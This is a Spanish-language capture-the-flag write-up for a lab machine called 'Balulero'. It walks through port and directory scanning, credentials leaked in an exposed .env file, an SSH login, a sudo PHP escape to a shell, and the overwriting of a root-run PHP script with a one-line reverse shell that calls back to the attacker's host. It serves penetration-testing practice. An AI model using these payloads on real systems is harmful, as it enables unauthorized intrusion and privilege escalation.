---
description: '🧠Dificultad: Fácil | 🔓18/03/2026'
---

# 🟩 Balulero

## 🕵️ Reconocimiento

Comenzamos con un escaneo de puertos con `nmap`:

{% code overflow="wrap" %}
```bash
nmap -sC -sV -Pn $IPTARGET | tee nmap
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

Vemos que se encuentran abiertos los puertos de SSH (22) y HTTP (80). Vamos a realizar un escaneo de directorios con `ffuf` sobre el servicio web:

{% code overflow="wrap" %}
```bash
ffuf -w /usr/share/wordlists/SecLists-2025.2/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u "http://$IPTARGET/FUZZ" -e .html,.php,.txt,.xml,.js
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

Si visualizamos el código javascript de `script.js` en el navegador, encontramos una línea llamativa donde menciona un fichero llamado `.env_de_baluchingon`:

<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

Si vemos el contenido de este fichero en la web, podemos observar unas credenciales.

<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

## 🚪 Ganando acceso

Nos conectamos con estas credenciales al servicio SSH.

<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

## 💥 Escalada de privilegios

Vemos los permisos que tenemos con `sudo` en este usuario:

<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

Vemos que tenemos permisos para usar el binario `/usr/bin/php` como el usuario `chocolate` sin necesidad de contraseña. Podemos usar `php` para llamar al binario `/bin/sh` y obtener una shell como `chocolate`.

{% code overflow="wrap" %}
```bash
sudo -u chocolate php -r 'system("/bin/sh -i");'
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

Si vemos los procesos que se están ejecutando como `root` en el sistema, vemos un proceso interesante:

{% code overflow="wrap" %}
```bash
ps aux | grep root
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

En concreto, el proceso que ejecuta `while true; do php /opt/script.php; sleep 5; done`. Si vemos el fichero `/opt/script.php`, tenemos permisos de escritura, por lo que podemos modificarlo para que ejecute una reverse shell hacia nuestra máquina atacante.

<figure><img src="../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

Modificamos el fichero y nos ponemos a la escucha en nuestra máquina kali:

{% code overflow="wrap" %}
```bash
echo '<?php $sock=fsockopen("172.17.0.1",9999);exec("sh <&3 >&3 2>&3"); ?>' > script.php
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
